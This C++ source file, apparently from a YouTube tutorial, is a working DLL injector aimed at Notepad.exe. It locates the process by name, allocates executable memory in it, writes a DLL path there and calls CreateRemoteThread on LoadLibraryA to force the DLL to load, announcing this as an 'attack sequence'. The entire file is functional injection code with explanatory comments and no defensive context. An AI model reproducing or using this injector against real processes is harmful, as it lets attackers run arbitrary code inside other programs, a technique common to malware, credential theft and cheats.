#include <iostream>
#include <tchar.h>
#include <wchar.h>
#include <Windows.h>
#include <TlHelp32.h>

#define DLL_PATH "D:\\Repos\\C++\\yt_tutorial_dll\\x64\\Debug\\yt_tutorial_dll.dll"     // check this for accurate DLL path location...
typedef int(__stdcall* f_funnyFunction)();			

// PRE-PROCESSOR directive to #define our binary name... makes it easy to switch targets but need to re-compile to change target
// better idea is to set as cmd line arg or user input during run time so re-compiling isn't required
#define TARGET_BINARY L"Notepad.exe"													

// forward declaration of our findPricessID function
DWORD findProcessID();


int main()
{
	DWORD pid;
	HANDLE hProcess;
	LPVOID lpBaseAddress;
	size_t sz = strlen(DLL_PATH);
	int output_val = 0;

	// can remove this if stdout output isn't desired
	std::cout << "Hello world, beginning attack sequence now!!\n";						

	// get pid for target binary
	pid = findProcessID();

	// this really should have a check to ensure PID != FALSE... 

	// get handle to target process
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, pid);

	// create memory in target process
	lpBaseAddress = VirtualAllocEx(hProcess, NULL, sz, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	// write dll path to the target binary's memory
	output_val = WriteProcessMemory(hProcess, lpBaseAddress, DLL_PATH, sz, NULL);

	// get handle to kernel32.dll
	HMODULE hModule = GetModuleHandle(L"kernel32.dll");

	// get address of LoadLibraryA
	LPVOID lpStartAddress = GetProcAddress(hModule, "LoadLibraryA");

	// create remote thread in target binary
	HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpStartAddress, lpBaseAddress, 0, NULL);


	// handle error creating a remote thread.  I simply have stdout printf statements... you could do better stuff here if desired
	if (hThread)
	{
		printf("Injection successful\n");
	}
	else
	{
		printf("Injection failed\n");
	}


}



DWORD findProcessID()
{
	HANDLE hProcessSnap;
	PROCESSENTRY32 pe32;
	DWORD dwPriorityClass;

	// get a snapshot of currently running processes
	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	pe32.dwSize = sizeof(PROCESSENTRY32);
	// ensure hProcessSnap actually got a snapshot, otherwise quit
	if (!Process32First(hProcessSnap, &pe32))
	{
		CloseHandle(hProcessSnap);
		return FALSE;
	}

	// iterate through the processes until we find the target, then return that specific process ID
	do {
		if (!wcscmp(pe32.szExeFile, TARGET_BINARY))
		{
			return pe32.th32ProcessID;
		}
	} while (Process32Next(hProcessSnap, &pe32));
	return 0;
}

